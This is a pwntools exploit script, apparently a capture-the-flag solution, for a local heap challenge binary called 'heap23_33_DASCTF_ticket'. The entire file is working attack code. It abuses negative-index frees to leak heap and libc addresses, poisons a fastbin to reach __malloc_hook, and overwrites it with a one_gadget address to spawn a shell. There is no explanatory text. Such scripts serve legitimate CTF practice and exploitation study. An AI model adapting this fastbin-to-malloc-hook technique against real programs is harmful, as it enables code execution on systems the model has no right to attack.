from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/bin/heap23_33_DASCTF_ticket')
p = process('./data/bin/heap23_33_DASCTF_ticket')
libc = elf.libc
sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()

def add(idx,size):
    sla(b'>> ',b'1')
    sla(b'Index:',str(idx).encode())
    sla(b'size:',str(size).encode())

def edit(idx,con):
    sla(b'>> ',b'3')
    sla(b'Index:',str(idx).encode())
    sla(b'remarks:',con)

def delete(idx):
    sla(b'>> ',b'2')
    sla(b'Index:',str(idx).encode())

def show(idx):
    sla(b'>> ',b'4')
    sla(b'Index:',str(idx).encode())

def change_info(name,con,age):
    sla(b'>> ',b'5')
    sla(b'name: ',name)
    sla(b'fei): ',con)
    sla(b'age: ',str(age).encode())

def show_info():
    sla(b'>> ',b'6')

sla(b'name: ',b'name');sla(b'fei): ',b'con');sla(b'age: ',str(0x602058).encode())
add(0,0x20);add(1,0x60);add(2,0xf8);add(3,0xf8);add(4,0xf8)
delete(0)
delete(-2)
show_info();ru(b'Name: ');heap_addr = u64(rc(4).ljust(8,b'\x00')) - 0x60
change_info(b'a',b'a',heap_addr+0x110)
delete(-3)
show(2);p.recv();libc_base = u64(rc(16)[-6:].ljust(8,b'\x00'))-88-0x3c4b20
add(0,0x60)
delete(0)
malloc_hook  = libc_base + libc.sym['__malloc_hook'];edit(2,p64(malloc_hook-0x23))
delete(3)
add(3,0x60)
add(0,0x60)
edit(0,b'a'*0x13+p64(0xf1247+libc_base))
delete(3)
add(3,0x60)
ti()